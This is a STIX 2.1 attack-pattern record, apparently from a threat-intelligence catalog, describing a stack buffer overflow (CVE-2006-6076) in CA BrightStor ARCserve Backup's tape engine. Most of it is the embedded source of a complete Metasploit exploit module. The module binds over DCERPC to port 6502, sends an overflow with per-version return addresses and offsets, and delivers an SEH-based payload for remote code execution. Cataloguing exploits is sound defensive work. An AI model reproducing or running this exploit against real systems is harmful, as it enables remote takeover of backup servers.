{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3ee6d591-86ff-4d18-8fad-33525d3a4b8c",
    "created": "2024-08-14T16:48:24.515047Z",
    "modified": "2024-08-14T16:48:24.515051Z",
    "name": "CA BrightStor ARCserve Tape Engine Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/tape_engine.rb",
            "external_id": "tape_engine.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6076"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor ARCserve Tape Engine Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup\n        r11.1 - r11.5. By sending a specially crafted DCERPC request, an attacker could overflow\n        the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'MC', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-6076' ],\n          [ 'OSVDB', '30637' ],\n          [ 'BID', '21221' ],\n          [ 'EDB', '3086' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'StackAdjustment' => -9500,\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n          [\n            [ 'BrightStor ARCserve r11.1', { 'Ret' => 0x2380cdc7, 'Offset' => 1158 } ], #p/p/r cheyprod.dll 07/21/2004\n            [ 'BrightStor ARCserve r11.5', { 'Ret' => 0x2380ceb5, 'Offset' => 1132 } ], #p/p/r cheyprod.dll ??/??/????\n          ],\n      'DisclosureDate' => '2006-11-21',\n      'DefaultTarget'  => 1))\n\n    register_options([ Opt::RPORT(6502) ])\n  end\n\n  def exploit\n    connect\n\n    handle = dcerpc_handle('62b93df0-8b02-11ce-876c-00805f842837', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    request =  \"\\x00\\x04\\x08\\x0c\\x02\\x00\\x00\\x00\\x00\\x00\"\n    request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    dcerpc.call(43, request)\n\n    filler = \"\\x10\\x09\\xf9\\x77\" + rand_text_english(target['Offset'])\n    seh    = generate_seh_payload(target.ret)\n    sploit = filler + seh\n\n    print_status(\"Trying target #{target.name}...\")\n\n      begin\n        dcerpc_call(38, sploit)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-21",
    "x_mitre_platforms": [
        "win'"
    ]
}